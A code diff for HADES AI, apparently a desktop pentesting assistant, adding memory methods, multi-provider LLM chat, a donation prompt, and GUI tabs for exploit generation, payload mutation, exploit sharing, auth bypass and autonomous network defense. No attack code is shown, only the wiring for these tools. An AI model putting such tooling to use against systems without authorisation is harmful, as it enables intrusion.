+            stats['cognitive_memories'] = self.cognitive.get_memory_stats()
         return stats
+
+    def get_implementation_catalog(self, refresh: bool = False) -> Dict[str, Any]:
+        """Return defensive metadata for the implementation folder (no execution)."""
+        if not self.current_implementation_integration:
+            return dict(self.current_implementation_catalog)
+
+        if refresh and hasattr(self.current_implementation_integration, 'catalog'):
+            self.current_implementation_catalog = self.current_implementation_integration.catalog.index()
+            return self.current_implementation_catalog
+
+        if hasattr(self.current_implementation_integration, 'get_catalog'):
+            self.current_implementation_catalog = self.current_implementation_integration.get_catalog()
+
+        return dict(self.current_implementation_catalog)
+
+    # ========== Amp Thread Learning Methods ==========
+    def _extract_text_fragments(self, node: Any) -> List[str]:
+        """Recursively extract text fragments from Amp thread JSON content."""
+        fragments: List[str] = []
+
+        if node is None:
+            return fragments
+        if isinstance(node, str):
+            text = node.strip()
+            if text:
+                fragments.append(text)
+            return fragments
+        if isinstance(node, list):
+            for item in node:
+                fragments.extend(self._extract_text_fragments(item))
+            return fragments
+        if isinstance(node, dict):
+            if isinstance(node.get('text'), str):
+                text = node['text'].strip()
+                if text:
+                    fragments.append(text)
+            if isinstance(node.get('output'), str):
+                output_text = node['output'].strip()
+                if output_text:
+                    fragments.append(output_text)
+
+            for key in ('content', 'input', 'result', 'message', 'run'):
+                if key in node:
+                    fragments.extend(self._extract_text_fragments(node[key]))
+            return fragments
+
+        return fragments
+
+    def _parse_amp_thread_file(self, file_path: Path) -> Tuple[str, List[Dict[str, Any]]]:
+        """Parse a thread export file and return normalized message entries."""
+        thread_id = file_path.stem
+        raw = file_path.read_text(encoding='utf-8', errors='ignore')
+
+        try:
+            data = json.loads(raw)
+        except Exception:
+            # Some files may be plain-text exports rather than strict JSON.
+            fallback_text = raw.strip()
+            fallback_messages = []
+            if fallback_text:
+                fallback_messages.append({'role': 'dataset', 'text': fallback_text[:12000], 'index': 0})
+            return thread_id, fallback_messages
+
+        if isinstance(data, dict):
+            thread_id = str(data.get('id') or thread_id)
+            raw_messages = data.get('messages', [])
+        elif isinstance(data, list):
+            raw_messages = data
+        else:
+            raw_messages = []
+
+        normalized: List[Dict[str, Any]] = []
+        for idx, msg in enumerate(raw_messages):
+            role = 'unknown'
+            content = msg
+
+            if isinstance(msg, dict):
+                role = str(msg.get('role') or role)
+                content = msg.get('content', msg)
+
+            fragments = self._extract_text_fragments(content)
+            combined = "\n".join(part for part in fragments if part).strip()
+            if not combined:
+                continue
+
+            normalized.append({
+                'role': role,
+                'text': combined[:12000],
+                'index': idx
+            })
+
+        return thread_id, normalized
+
+    def learn_from_amp_threads_folder(self, folder_path: Optional[str] = None,
+                                      refresh_changed_only: bool = True,
+                                      max_files: int = 5000) -> Dict[str, Any]:
+        """Import local amp thread JSON exports into the knowledge base."""
+        base_folder = Path(folder_path or self.amp_threads_folder)
+        result = {
+            'folder': str(base_folder),
+            'scanned_files': 0,
+            'imported_threads': 0,
+            'skipped_threads': 0,
+            'failed_threads': 0,
+            'total_messages': 0,
+            'errors': []
+        }
+
+        if not base_folder.exists() or not base_folder.is_dir():
+            return result
+
+        files = sorted(base_folder.glob('*.json'))[:max_files]
+        result['scanned_files'] = len(files)
+
+        for file_path in files:
+            try:
+                raw_bytes = file_path.read_bytes()
+                file_hash = hashlib.sha256(raw_bytes).hexdigest()
+
+                thread_id, messages = self._parse_amp_thread_file(file_path)
+                if not thread_id:
+                    thread_id = file_path.stem
+
+                existing_hash = self.kb.get_amp_thread_source_hash(thread_id)
+                if refresh_changed_only and existing_hash == file_hash:
+                    result['skipped_threads'] += 1
+                    continue
+
+                self.kb.replace_amp_thread_messages(
+                    thread_id=thread_id,
+                    source_path=str(file_path),
+                    file_hash=file_hash,
+                    messages=messages
+                )
+                result['imported_threads'] += 1
+                result['total_messages'] += len(messages)
+            except Exception as e:
+                result['failed_threads'] += 1
+                result['errors'].append(f"{file_path.name}: {str(e)}")
+
+        return result
+
+    def get_amp_threads_context(self, query: str, limit: int = 8,
+                                char_limit: int = 2200) -> str:
+        """Build concise context from imported amp thread messages."""
+        matches = self.kb.search_amp_thread_messages(query, limit=limit)
+        if not matches:
+            return ""
+
+        lines = ["Local amp threads teaching context:"]
+        current_len = len(lines[0])
+
+        for msg in matches:
+            snippet = " ".join((msg.get('text') or '').split())
+            if len(snippet) > 260:
+                snippet = snippet[:257] + "..."
+
+            line = f"- [{msg.get('thread_id')}:{msg.get('role')}] {snippet}"
+            if current_len + len(line) + 1 > char_limit:
+                break
+            lines.append(line)
+            current_len += len(line) + 1
+
+        return "\n".join(lines)
+    
+    # ========== Cognitive Memory Methods ==========
+    def remember(self, text: str, importance: float = 0.5, metadata: dict = None) -> Optional[str]:
+        """Store content in cognitive memory."""
+        if not self.cognitive:
+            return None
+        return self.cognitive.remember(text, importance, metadata)
+    
+    def recall(self, query: str, top_k: int = 5) -> List[tuple]:
+        """Retrieve relevant memories by semantic similarity."""
+        if not self.cognitive:
+            return []
+        return self.cognitive.recall(query, top_k)
+    
+    def optimize_memory(self, prune_threshold: float = 0.2, apply_decay: bool = True) -> Dict:
+        """Optimize cognitive memory storage."""
+        if not self.cognitive:
+            return {'error': 'Cognitive memory not available'}
+        return self.cognitive.optimize(prune_threshold, apply_decay)
+    
+    def forget(self, memory_id: str) -> bool:
+        """Remove a specific memory."""
+        if not self.cognitive:
+            return False
+        return self.cognitive.forget(memory_id)
+    
+    def get_memory_stats(self) -> Dict:
+        """Get cognitive memory statistics."""
+        if not self.cognitive:
+            return {'error': 'Cognitive memory not available'}
+        return self.cognitive.get_memory_stats()
+    
+    # ========== Feedback Loop Methods ==========
+    def evaluate_response(self, user_input: str, ai_output: str, 
+                         success_score: float, metadata: dict = None) -> Optional[str]:
+        """
+        Evaluate an AI response and update memory based on outcome.
+        
+        Args:
+            user_input: User's original query
+            ai_output: AI's response
+            success_score: Success evaluation (0.0-1.0)
+            metadata: Optional metadata about interaction
+            
+        Returns:
+            Reflection ID or None if cognitive memory unavailable
+        """
+        if not self.cognitive:
+            return None
+        return self.cognitive.evaluate_response(user_input, ai_output, success_score, metadata)
+    
+    def reinforce_memory(self, memory_id: str, success_score: float) -> bool:
+        """Reinforce a specific memory based on feedback."""
+        if not self.cognitive:
+            return False
+        return self.cognitive.reinforce_memory(memory_id, success_score)
+    
+    def generate_with_memory(self, query: str, llm_call: Callable) -> tuple:
+        """
+        Generate a response using cognitive memory for context.
+        Memory-augmented generation improves response quality and speed.
+        
+        Args:
+            query: User query
+            llm_call: LLM function that accepts (query, memory_context)
+            
+        Returns:
+            Tuple of (response, recalled_memories)
+        """
+        if not self.cognitive:
+            return llm_call(query, ""), []
+        
+        def context_provider(q, mem_context):
+            prompt = f"""Relevant prior knowledge:
+{mem_context}
+
+Current query:
+{q}"""
+            return llm_call(prompt)
+        
+        return self.cognitive.generate_with_memory(query, context_provider)
+    
+    def get_full_cognitive_stats(self) -> Dict:
+        """Get comprehensive statistics about memories and reflections."""
+        if not self.cognitive:
+            return {'error': 'Cognitive memory not available'}
+        return self.cognitive.get_full_stats()
+    
+    # ========== Background Optimizer ==========
+    def _start_background_optimizer(self, interval_seconds: int = 3600):
+        """
+        Start background memory optimizer thread.
+        Runs periodically to prune and compress memories.
+        
+        Args:
+            interval_seconds: Optimization interval (default: 1 hour)
+        """
+        if not self.cognitive:
+            return
+        
+        def background_optimizer():
+            while True:
+                try:
+                    time.sleep(interval_seconds)
+                    if self.cognitive:
+                        stats = self.cognitive.optimize(
+                            prune_threshold=0.25,
+                            apply_decay=True
+                        )
+                        logger.info(f"Background optimization: pruned {stats['pruned_count']} memories")
+                except Exception as e:
+                    logger.error(f"Background optimizer error: {e}")
+        
+        self._optimizer_thread = threading.Thread(
+            target=background_optimizer,
+            daemon=True,
+            name="HadesAI-MemoryOptimizer"
+        )
+        self._optimizer_thread.start()
+        logger.info("Background memory optimizer started")
     def dispatch(self, user_input):
         """Dispatch commands - supports file operations, GPT analysis, and mode switching"""
         user_input = user_input.strip()
@@ -2104,13 +3574,18 @@ class HadesAI:
         except Exception as e:
             return f"❌ Assistant Error:\n{traceback.format_exc()}"
     
-    def gpt_chat(self, message: str) -> str:
+    def gpt_chat(self, message: str, api_key: str = None) -> str:
         """Direct GPT chat for code-related questions"""
-        if not HAS_OPENAI or not openai or not openai.api_key:
-            return "GPT not available. Set OPENAI_API_KEY environment variable."
+        if not HAS_OPENAI:
+            return "GPT not available. Install with: pip install openai"
+        
+        key = api_key or os.getenv("OPENAI_API_KEY", "")
+        if not key:
+            return "GPT not available. Enter your API key in the Self-Improvement tab."
         
         try:
-            response = openai.ChatCompletion.create(
+            client = OpenAI(api_key=key)
+            response = client.chat.completions.create(
                 model="gpt-3.5-turbo",
                 messages=[
                     {"role": "system", "content": "You are HADES, an expert security and coding assistant. Help with pentesting, code analysis, and security questions."},
@@ -2122,6 +3597,119 @@ class HadesAI:
             return response.choices[0].message.content
         except Exception as e:
             return f"GPT Error: {e}"
+    
+    def llm_chat(self, message: str, provider: str = None, model: str = None, 
+                 system_prompt: str = None, use_streaming: bool = False):
+        """
+        Unified LLM chat across multiple providers (OpenAI, Mistral, Ollama, Azure)
+        
+        Args:
+            message: User message
+            provider: LLM provider ('openai', 'mistral', 'ollama', 'azure', 'fallback')
+            model: Specific model to use (e.g., 'gpt-3.5-turbo', 'mistral-tiny')
+            system_prompt: Custom system prompt
+            use_streaming: Enable response streaming
+            
+        Returns:
+            str or Iterator[str]: Response text or stream chunks
+        """
+        if not self.llm_manager:
+            return "❌ LLM Core not initialized. Check dependencies."
+        
+        try:
+            available_providers = self.llm_manager.get_available_providers()
+
+            # Prefer local/free providers when no API keys are configured.
+            resolved_provider = provider
+            if not resolved_provider:
+                if "ollama" in available_providers:
+                    resolved_provider = "ollama"
+                elif "fallback" in available_providers:
+                    resolved_provider = "fallback"
+                elif available_providers:
+                    resolved_provider = available_providers[0]
+                else:
+                    resolved_provider = "fallback"
+
+            if resolved_provider not in available_providers:
+                if "ollama" in available_providers:
+                    resolved_provider = "ollama"
+                elif "fallback" in available_providers:
+                    resolved_provider = "fallback"
+
+            model_defaults = {
+                "openai": "gpt-3.5-turbo",
+                "mistral": "mistral-small-latest",
+                "ollama": "llama3.2",
+                "azure": "gpt-35-turbo",
+                "fallback": "fallback",
+            }
+            resolved_model = model or model_defaults.get(resolved_provider, "fallback")
+
+            default_system_prompt = "You are HADES, an expert security and coding assistant."
+            base_system_prompt = system_prompt or default_system_prompt
+            amp_context = self.get_amp_threads_context(message)
+            effective_system_prompt = base_system_prompt
+            if amp_context:
+                effective_system_prompt = (
+                    f"{base_system_prompt}\n\n"
+                    f"Use this local context from the amp threads learning folder when relevant:\n"
+                    f"{amp_context}\n\n"
+                    "Prefer accurate retrieval over speculation."
+                )
+
+            # Create or reuse conversation
+            if not hasattr(self, '_llm_conversation'):
+                self._llm_conversation = self.llm_manager.create_conversation(
+                    title="HadesAI Session",
+                    provider=resolved_provider,
+                    model=resolved_model,
+                    system_prompt=effective_system_prompt
+                )
+            else:
+                # Update provider/model if specified
+                current_provider = self._llm_conversation.provider
+                current_model = self._llm_conversation.model
+                if current_provider != resolved_provider or current_model != resolved_model:
+                    switched = self.llm_manager.switch_provider(
+                        self._llm_conversation.id,
+                        resolved_provider,
+                        resolved_model,
+                    )
+                    if not switched and "fallback" in available_providers:
+                        self.llm_manager.switch_provider(
+                            self._llm_conversation.id,
+                            "fallback",
+                            model_defaults["fallback"],
+                        )
+
+                # Keep system prompt aligned with current context without exposing it in user-visible input.
+                if hasattr(self, '_llm_conversation'):
+                    self._llm_conversation.system_prompt = effective_system_prompt
+                    self.llm_manager._save_conversation(self._llm_conversation)
+
+            # Ensure prompt refresh also applies right after initial conversation creation.
+            if hasattr(self, '_llm_conversation') and self._llm_conversation.system_prompt != effective_system_prompt:
+                self._llm_conversation.system_prompt = effective_system_prompt
+                self.llm_manager._save_conversation(self._llm_conversation)
+
+            # Send message
+            response = self.llm_manager.send_message(
+                message,
+                conv_id=self._llm_conversation.id,
+                use_streaming=use_streaming
+            )
+            return response
+        except Exception as e:
+            logger.error(f"LLM chat error: {str(e)}")
+            return f"❌ LLM Error: {str(e)}"
+    
+    def get_available_llm_providers(self) -> List[str]:
+        """Get list of available LLM providers"""
+        if not self.llm_manager:
+            return []
+        return self.llm_manager.get_available_providers()
+    
     def full_site_scan(self, url: str, callback=None) -> Dict[str, Any]:
         """
         Comprehensive automated reconnaissance on a target URL.
@@ -2820,7 +4408,10 @@ class HadesAI:
             cursor = self.kb.conn.cursor()
             cursor.execute('DELETE FROM threat_findings')
             cursor.execute('DELETE FROM learned_exploits')
-            cursor.execute('DELETE FROM cache_entries')
+            try:
+                cursor.execute('DELETE FROM cache_entries')
+            except sqlite3.Error:
+                pass
             self.kb.conn.commit()
     
     def _get_owasp_category(self, threat_type: str) -> str:
@@ -2958,13 +4549,26 @@ class HadesAI:
 # ============================================================================
 
 class HadesGUI(QMainWindow):
+    DONATE_URL = "https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00"
+    
     def __init__(self):
         super().__init__()
         self.ai = HadesAI()
         self.scanner = None
         self.tool_executor = None
         self.network_monitor = None
+        self.autonomous_defense = None  # Autonomous defense engine
+        self.standalone_defense_mode = False
+        self.brain = pcore.load_brain()
+        
+        # Initialize exploit sharing
+        self.exploit_sharer = None
+        if HAS_EXPLOIT_SEEK:
+            import uuid
+            self.exploit_sharer = P2PExploitSharer(instance_id=str(uuid.uuid4()))
+        
         self.init_ui()
+        self._show_startup_dialog()
         
     def init_ui(self):
         self.setWindowTitle("HADES AI - Interactive Pentesting Assistant")
@@ -2979,6 +4583,7 @@ class HadesGUI(QMainWindow):
         layout.addWidget(self.tabs)
         
         self.tabs.addTab(self._create_chat_tab(), "💬 AI Chat")
+        self.tabs.addTab(self._create_active_defense_tab(), "🛡️ Active Defense")
         self.tabs.addTab(self._create_network_monitor_tab(), "🛡️ Network Monitor")
         self.tabs.addTab(self._create_web_knowledge_tab(), "🧠 Web Knowledge")
         self.tabs.addTab(self._create_tools_tab(), "🛠️ Tools & Targets")
@@ -2986,12 +4591,72 @@ class HadesGUI(QMainWindow):
         self.tabs.addTab(self._create_injection_tab(), "💉 Request Injection")
         self.tabs.addTab(self._create_auth_bypass_tab(), "🔓 Auth Bypass")
         self.tabs.addTab(self._create_proxy_tab(), "🌐 Proxy Settings")
+        if HAS_PAYLOAD_GEN:
+            self.tabs.addTab(PayloadGeneratorTab(), "📦 Payload Gen")
+        if HAS_DATA_MAPPING:
+            self.tabs.addTab(DataMappingTab(), "🗺️ Data Mapping")
         self.tabs.addTab(self._create_findings_tab(), "🔍 Threat Findings")
         self.tabs.addTab(self._create_learned_tab(), "🧠 Learned Exploits")
+        if HAS_EXPLOIT_TOME:
+            try:
+                self.tabs.addTab(ExploitTomeTab(), "📚 Exploit Tome")
+            except Exception as e:
+                logger.warning(f"Exploit Tome tab failed: {e}")
+        if HAS_EXPLOIT_GEN:
+            try:
+                self.exploit_gen_tab = ExploitGeneratorTab(
+                    ai_callback=self.generate_response_for_exploit_gen
+                )
+                self.tabs.addTab(self.exploit_gen_tab, "⚔️ Exploit Generator")
+            except Exception as e:
+                logger.warning(f"Exploit Generator tab failed: {e}")
         self.tabs.addTab(self._create_cache_tab(), "📂 Cache Scanner")
         self.tabs.addTab(self._create_code_tab(), "💻 Code Analysis")
         self.tabs.addTab(self._create_code_helper_tab(), "💻 Code Helper")
+        self.tabs.addTab(self._create_self_improvement_tab(), "🔧 Self-Improvement")
         self.tabs.addTab(self._create_autorecon_tab(), "🧠 AutoRecon")
+        self.tabs.addTab(self._create_modules_tab(), "🧩 Modules")
+        if HAS_SCRIPT_EDITOR:
+            self.tabs.addTab(PythonScriptEditorTab(), "📜 Script Editor")
+        if HAS_REALISTIC_SIMS:
+            self.tabs.addTab(create_realistic_simulations_tab(), "🎯 Simulations")
+        if HAS_EXPLOIT_SEEK and self.exploit_sharer:
+            try:
+                self.exploit_seek_tab = create_exploit_seek_tab(self, self.exploit_sharer, self.ai)
+                self.tabs.addTab(self.exploit_seek_tab, "🔍 Exploit Seek")
+            except Exception as e:
+                logger.warning(f"Exploit Seek tab failed: {e}")
+        if HAS_DEPLOYMENT_AUTOMATION:
+            try:
+                self.deployment_automation_tab = DeploymentAutomationTab(db_path="hades_knowledge.db")
+                self.tabs.addTab(self.deployment_automation_tab, "🚀 Deploy & Test")
+            except Exception as e:
+                logger.warning(f"Deployment Automation tab failed: {e}")
+        if HAS_AUTONOMOUS_AGENT:
+            self.tabs.addTab(self._create_agent_tab(), "🤖 Autonomous Coder")
+        
+        # PHASE 1 INTEGRATION TABS - Critical Systems
+        if HAS_PHASE1_INTEGRATION:
+            try:
+                self.obsidian_tab = ObsidianCoreTab()
+                self.tabs.addTab(self.obsidian_tab, "🤖 AI Orchestration")
+                logger.info("✓ ObsidianCore tab added")
+            except Exception as e:
+                logger.warning(f"ObsidianCore tab failed: {str(e)}")
+            
+            try:
+                self.ethical_tab = EthicalControlTab()
+                self.tabs.addTab(self.ethical_tab, "🔒 Ethical Control")
+                logger.info("✓ EthicalControl tab added")
+            except Exception as e:
+                logger.warning(f"EthicalControl tab failed: {str(e)}")
+            
+            try:
+                self.malware_tab = MalwareEngineTab()
+                self.tabs.addTab(self.malware_tab, "🔄 Payload Mutation")
+                logger.info("✓ MalwareEngine tab added")
+            except Exception as e:
+                logger.warning(f"MalwareEngine tab failed: {str(e)}")
         
         self.status_bar = QStatusBar()
         self.setStatusBar(self.status_bar)
@@ -2999,6 +4664,21 @@ class HadesGUI(QMainWindow):
         self.progress.setMaximumWidth(200)
         self.progress.hide()
         self.status_bar.addPermanentWidget(self.progress)
+        
+        # Donate button in status bar
+        donate_btn = QPushButton("💝 Support Development")
+        donate_btn.setStyleSheet("""
+            QPushButton { 
+                background: linear-gradient(45deg, #ff6b6b, #e94560); 
+                color: white; 
+                padding: 5px 15px; 
+                border-radius: 3px;
+                font-weight: bold;
+            }
+            QPushButton:hover { background: #ff8585; }
+        """)
+        donate_btn.clicked.connect(self._open_donate_link)
+        self.status_bar.addPermanentWidget(donate_btn)
         
     def _get_style(self) -> str:
         return """
@@ -3020,10 +4700,86 @@ class HadesGUI(QMainWindow):
             QProgressBar { border: 1px solid #0f3460; border-radius: 5px; text-align: center; }
             QProgressBar::chunk { background: #e94560; }
         """
+    
+    def _show_startup_dialog(self):
+        """Show donation/welcome dialog on startup."""
+        import webbrowser
+        
+        dialog = QMessageBox(self)
+        dialog.setWindowTitle("Welcome to HADES AI")
+        dialog.setIconPixmap(dialog.style().standardPixmap(dialog.style().StandardPixmap.SP_MessageBoxInformation))
+        dialog.setText("""
+<h2 style='color: #e94560;'>🔥 HADES AI - Pentesting Assistant</h2>
+<p>Thank you for using HADES AI!</p>
+<p>This tool is <b>free and open source</b>. If you find it useful, 
+please consider supporting its development.</p>
+<p style='color: #4CAF50;'>Your support helps keep this project alive!</p>
+        """)
+        dialog.setTextFormat(Qt.TextFormat.RichText)
+        
+        donate_btn = dialog.addButton("💝 Donate Now", QMessageBox.ButtonRole.AcceptRole)
+        later_btn = dialog.addButton("Maybe Later", QMessageBox.ButtonRole.RejectRole)
+        
+        dialog.setStyleSheet("""
+            QMessageBox { background-color: #1a1a2e; }
+            QMessageBox QLabel { color: #eee; font-size: 12px; }
+            QPushButton { 
+                background: #e94560; 
+                color: white; 
+                padding: 8px 20px; 
+                border-radius: 5px; 
+                font-weight: bold;
+                min-width: 100px;
+            }
+            QPushButton:hover { background: #ff6b6b; }
+        """)
+        
+        dialog.exec()
+        
+        if dialog.clickedButton() == donate_btn:
+            webbrowser.open(self.DONATE_URL)
+    
+    def _open_donate_link(self):
+        """Open donation link in browser."""
+        import webbrowser
+        webbrowser.open(self.DONATE_URL)
+
+    def _set_current_tab_by_label(self, label_contains: str, fallback_index: Optional[int] = None) -> bool:
+        """Select a tab by label text to avoid brittle hardcoded tab indices."""
+        target = label_contains.lower()
+        for idx in range(self.tabs.count()):
+            if target in self.tabs.tabText(idx).lower():
+                self.tabs.setCurrentIndex(idx)
+                return True
+        if fallback_index is not None and 0 <= fallback_index < self.tabs.count():
+            self.tabs.setCurrentIndex(fallback_index)
+            return True
+        return False
         
     def _create_chat_tab(self) -> QWidget:
         widget = QWidget()
         layout = QVBoxLayout(widget)
+        
+        # LLM Provider Selection
+        llm_provider_layout = QHBoxLayout()
+        llm_provider_layout.addWidget(QLabel("🤖 LLM Provider:"))
+        
+        self.llm_provider_combo = QComboBox()
+        available_providers = self.ai.get_available_llm_providers()
+        if available_providers:
+            self.llm_provider_combo.addItems(available_providers)
+        else:
+            self.llm_provider_combo.addItem("fallback")
+        self.llm_provider_combo.setMinimumWidth(150)
+        self.llm_provider_combo.setStyleSheet("background: #1a1a2e; color: #eee;")
+        llm_provider_layout.addWidget(self.llm_provider_combo)
+        
+        llm_info_label = QLabel(f"Available: {', '.join(available_providers) if available_providers else 'fallback only'}")
+        llm_info_label.setStyleSheet("color: #888; font-size: 9pt;")
+        llm_provider_layout.addWidget(llm_info_label)
+        llm_provider_layout.addStretch()
+        
+        layout.addLayout(llm_provider_layout)
         
         self.chat_display = QTextEdit()
         self.chat_display.setReadOnly(True)
@@ -3031,7 +4787,7 @@ class HadesGUI(QMainWindow):
         self.chat_display.setMinimumHeight(500)
         layout.addWidget(self.chat_display)
         
-        self._add_chat_message("system", "Welcome to HADES AI! I'm your interactive pentesting assistant.\n\nI can:\n• Scan ports, directories, and subdomains\n• Learn exploits from websites\n• Analyze browser cache for threats\n• Remember patterns and improve over time\n\nType 'help' for commands or just tell me what you want to do!")
+        self._add_chat_message("system", "Welcome to HADES AI! I'm your interactive pentesting assistant.\n\nI can:\n• Scan ports, directories, and subdomains\n• Learn exploits from websites\n• Analyze browser cache for threats\n• Remember patterns and improve over time\n• Use advanced LLMs (OpenAI, Mistral, Ollama, Azure)\n\nType 'help' for commands or just tell me what you want to do!")
         
         input_layout = QHBoxLayout()
         self.chat_input = QLineEdit()
@@ -3095,6 +4851,32 @@ class HadesGUI(QMainWindow):
         self.learning_mode_check.toggled.connect(self._toggle_learning_mode)
         control_layout.addWidget(self.learning_mode_check)
         
+        # Autonomous Defense Controls
+        control_layout.addWidget(QLabel("  |  "))
+        
+        self.autonomous_defense_check = QCheckBox("🤖 Autonomous Defense")
+        self.autonomous_defense_check.setStyleSheet("color: #00fff2; font-weight: bold;")
+        self.autonomous_defense_check.setToolTip("Enable AI-driven autonomous defensive actions:\n"
+            "• Honeypot deployment for attacker deception\n"
+            "• Rate limiting and connection throttling\n"
+            "• DNS sinkholing for malicious domains\n"
+            "• Adaptive response based on threat severity\n"
+            "• Deceptive responses to waste attacker resources")
+        self.autonomous_defense_check.toggled.connect(self._toggle_autonomous_defense)
+        control_layout.addWidget(self.autonomous_defense_check)
+        
+        self.defense_level_combo = QComboBox()
+        self.defense_level_combo.addItems(["Passive", "Reactive", "Proactive", "Aggressive"])
+        self.defense_level_combo.setCurrentIndex(1)  # Default: Reactive
+        self.defense_level_combo.setStyleSheet("background: #1a1a2e; color: #eee;")
+        self.defense_level_combo.setToolTip("Defense Level:\n"
+            "• Passive: Monitor and log only\n"
+            "• Reactive: Respond to detected threats\n"
+            "• Proactive: Actively hunt and deploy honeypots\n"
+            "• Aggressive: Maximum defense with countermeasures")
+        self.defense_level_combo.currentIndexChanged.connect(self._on_defense_level_changed)
+        control_layout.addWidget(self.defense_level_combo)
+        
         control_layout.addStretch()
         layout.addWidget(control_group)
         
@@ -3110,6 +4892,8 @@ class HadesGUI(QMainWindow):
             ('attacks_blocked', 'Blocked', '0'),
             ('unique_ips', 'Unique IPs', '0'),
             ('blocked_ips', 'Blocked IPs', '0'),
+            ('honeypot_hits', 'Honeypot Hits', '0'),
+            ('auto_mitigated', 'Auto Mitigated', '0'),
         ]
         
         for key, label, default in stat_items:
@@ -3188,7 +4972,719 @@ class HadesGUI(QMainWindow):
         layout.addWidget(self.net_status_label)
         
         return widget
+        
+    def _create_active_defense_tab(self) -> QWidget:
+        """Separate defense tab for managing autonomous defense independently from network monitor"""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        if not HAS_AUTONOMOUS_DEFENSE:
+            layout.addWidget(QLabel("Autonomous defense module not available."))
+            widget.setLayout(layout)
+            return widget
+
+        # Create a separate autonomous defense instance for this tab
+        self.defense_tab_engine = AutonomousDefenseEngine()
+
+        status_group = QGroupBox("Defense Status")
+        status_layout = QVBoxLayout(status_group)
+        self.defense_status_label = QLabel("Status: Disabled")
+        self.defense_status_label.setStyleSheet("color: #ff6b6b;")
+        status_layout.addWidget(self.defense_status_label)
+
+        control_layout = QHBoxLayout()
+        self.defense_enable_btn = QPushButton("Enable Defense")
+        self.defense_enable_btn.clicked.connect(self._toggle_defense_tab)
+        self.defense_block_btn = QPushButton("Block IP")
+        self.defense_block_btn.clicked.connect(self._block_ip_from_defense_tab)
+        self.defense_unblock_btn = QPushButton("Unblock IP")
+        self.defense_unblock_btn.clicked.connect(self._unblock_ip_from_defense_tab)
+        self.defense_block_input = QLineEdit()
+        self.defense_block_input.setPlaceholderText("IP address to block")
+
+        control_layout.addWidget(self.defense_enable_btn)
+        control_layout.addWidget(self.defense_block_input)
+        control_layout.addWidget(self.defense_block_btn)
+        control_layout.addWidget(self.defense_unblock_btn)
+        control_layout.addStretch()
+
+        status_layout.addLayout(control_layout)
+        layout.addWidget(status_group)
+
+        config_group = QGroupBox("Configuration")
+        config_layout = QFormLayout(config_group)
+
+        self.defense_tab_level_combo = QComboBox()
+        self.defense_tab_level_combo.addItems(["PASSIVE", "REACTIVE", "PROACTIVE", "AGGRESSIVE"])
+        self.defense_tab_level_combo.setCurrentText("REACTIVE")
+        self.defense_tab_level_combo.currentTextChanged.connect(self._on_active_defense_level_changed)
+        config_layout.addRow("Defense Level:", self.defense_tab_level_combo)
+
+        self.defense_auto_response_cb = QCheckBox("Auto-Response")
+        self.defense_auto_response_cb.setChecked(True)
+        self.defense_auto_response_cb.toggled.connect(self._on_active_defense_auto_response_changed)
+        config_layout.addRow("Auto-Response:", self.defense_auto_response_cb)
+
+        self.defense_block_threshold = QDoubleSpinBox()
+        self.defense_block_threshold.setRange(0.0, 1.0)
+        self.defense_block_threshold.setValue(0.7)
+        self.defense_block_threshold.setSingleStep(0.05)
+        self.defense_block_threshold.valueChanged.connect(self._on_active_defense_threshold_changed)
+        config_layout.addRow("Block Threshold:", self.defense_block_threshold)
+
+        layout.addWidget(config_group)
+
+        stats_group = QGroupBox("Defense Stats")
+        stats_layout = QHBoxLayout(stats_group)
+        self.defense_tab_stats_labels = {}
+        stats_fields = [
+            ('threats_mitigated', 'Mitigated', '0'),
+            ('ips_blocked', 'IPs Blocked', '0'),
+            ('honeypot_hits', 'Honeypot Hits', '0'),
+            ('active_honeypots', 'Active Honeypots', '0'),
+            ('tracked_ips', 'Tracked IPs', '0'),
+        ]
+        for key, title, default in stats_fields:
+            card = QGroupBox(title)
+            card_layout = QVBoxLayout(card)
+            value_lbl = QLabel(default)
+            value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            value_lbl.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
+            value_lbl.setStyleSheet("color: #00fff2;")
+            card_layout.addWidget(value_lbl)
+            self.defense_tab_stats_labels[key] = value_lbl
+            stats_layout.addWidget(card)
+        layout.addWidget(stats_group)
+
+        layout.addWidget(QLabel("Threat Log (Recent)"))
+        self.defense_threat_log = QTextEdit()
+        self.defense_threat_log.setReadOnly(True)
+        self.defense_threat_log.setMaximumHeight(150)
+        layout.addWidget(self.defense_threat_log)
+
+        layout.addWidget(QLabel("Blocked IPs"))
+        self.defense_blocked_ips = QTextEdit()
+        self.defense_blocked_ips.setReadOnly(True)
+        self.defense_blocked_ips.setMaximumHeight(100)
+        layout.addWidget(self.defense_blocked_ips)
+
+        # Tab-specific event hooks
+        self.defense_tab_engine.on_action_taken = self._on_active_defense_action_taken
+        self.defense_tab_engine.on_threat_mitigated = self._on_active_defense_threat_mitigated
+        self._apply_active_defense_tab_config()
+        self._update_defense_blocked_ips_log()
+        self._update_active_defense_stats()
+
+        layout.addStretch()
+        widget.setLayout(layout)
+        return widget
+
+    def _apply_active_defense_tab_config(self):
+        """Apply UI configuration values to the defense engine."""
+        if not hasattr(self, 'defense_tab_engine'):
+            return
+
+        auto_response = self.defense_auto_response_cb.isChecked() if hasattr(self, 'defense_auto_response_cb') else True
+        threshold = self.defense_block_threshold.value() if hasattr(self, 'defense_block_threshold') else 0.7
+
+        # Auto-response toggle controls whether defense rules execute actions.
+        for rule in self.defense_tab_engine.defense_rules:
+            rule.enabled = auto_response
+
+        # Map UI threshold (0.0-1.0) to rate-limiter sensitivity.
+        # Lower value => stricter / blocks faster, higher => more lenient.
+        limiter = self.defense_tab_engine.rate_limiter
+        limiter.block_threshold = max(50, int(50 + (threshold * 450)))
+        limiter.connections_per_minute = max(20, int(limiter.block_threshold * 0.25))
+        limiter.connections_per_second = max(5, int(limiter.connections_per_minute / 12))
+
+    def _append_active_defense_log(self, message: str):
+        if hasattr(self, 'defense_threat_log'):
+            self.defense_threat_log.append(message)
+
+    def _update_active_defense_stats(self):
+        """Refresh Active Defense stats panel from engine metrics."""
+        if not hasattr(self, 'defense_tab_engine') or not hasattr(self, 'defense_tab_stats_labels'):
+            return
+
+        try:
+            stats = self.defense_tab_engine.get_stats()
+            self.defense_tab_stats_labels['threats_mitigated'].setText(str(stats.get('threats_mitigated', 0)))
+            limiter_stats = stats.get('rate_limiter', {}) if isinstance(stats.get('rate_limiter', {}), dict) else {}
+            blocked_count = max(int(stats.get('ips_blocked', 0)), int(limiter_stats.get('blocked_count', 0)))
